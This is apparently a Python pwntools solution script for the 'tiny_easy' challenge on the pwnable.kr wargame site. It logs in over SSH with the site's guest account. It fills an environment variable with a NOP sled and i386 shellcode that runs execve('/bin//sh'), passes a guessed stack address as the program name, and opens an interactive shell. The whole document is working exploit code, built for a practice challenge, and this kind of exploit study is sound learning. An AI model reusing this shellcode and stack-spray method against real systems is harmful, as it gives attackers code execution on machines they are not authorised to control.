from pwn import *
context(arch='i386', os='linux')
server = ["pwnable.kr", 2222, "tiny_easy", "guest"]

con = ssh(host=server[0], port=server[1], user=server[2], password=server[3])
payload =  "\x90"*10000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
e = {}
arg = [p32(0xff888888)]
e['1'] = payload

p = con.process(executable="/home/tiny_easy/tiny_easy",argv = arg, env = e)
p.interactive()


